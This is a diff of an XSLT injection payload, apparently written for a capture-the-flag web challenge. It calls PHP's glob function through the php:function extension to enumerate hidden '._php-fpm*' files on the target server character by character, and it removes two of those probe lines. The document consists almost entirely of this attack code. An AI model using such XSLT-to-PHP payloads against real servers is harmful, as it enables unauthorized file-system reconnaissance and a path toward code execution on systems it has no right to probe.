@@ -81,8 +81,7 @@ xmlns:php="http://php.net/xsl"
 <xsl:param  name="shandle22"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm[*')" />
 <xsl:param  name="shandle23"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm]*')" />
 <xsl:param  name="shandle24"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm|*')" />
-<xsl:param  name="shandle25"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm<*')" />
-<xsl:param  name="shandle26"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm>*')" />
+
 <xsl:param  name="shandle27"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.*')" />
 <xsl:param  name="shandle28"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm;*')" />
 <xsl:param  name="shandle29"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm:*')" />
@@ -168,8 +167,7 @@ SCANDIR0 ._1*:<xsl:value-of select="$shandle21"/>
 SCANDIR0 ._2*:<xsl:value-of select="$shandle22"/>
 SCANDIR0 ._3*:<xsl:value-of select="$shandle23"/>
 SCANDIR0 ._4*:<xsl:value-of select="$shandle24"/>
-SCANDIR0 ._5*:<xsl:value-of select="$shandle25"/>
-SCANDIR0 ._6*:<xsl:value-of select="$shandle26"/>
+
 SCANDIR0 ._7*:<xsl:value-of select="$shandle27"/>
 SCANDIR0 ._8*:<xsl:value-of select="$shandle28"/>
 SCANDIR0 ._9*:<xsl:value-of select="$shandle29"/>
